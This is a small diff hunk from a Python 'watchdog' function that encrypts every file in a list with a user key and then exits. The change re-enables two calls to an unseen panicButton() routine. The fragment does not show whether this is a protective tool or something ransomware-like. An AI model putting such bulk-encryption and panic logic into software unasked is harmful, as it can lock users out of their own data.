@@ -100,10 +100,10 @@ def watchdog(encFlag):
 					encryptFile(fileName, userKey)
 					print(' [+] Successfully encrypted file.')
 			print(' [+] Finished encrypting file list.')
-			#panicButton()
+			panicButton()
 			os._exit(1)
 		else:
-			#panicButton()
+			panicButton()
 			os._exit(1)
 
 
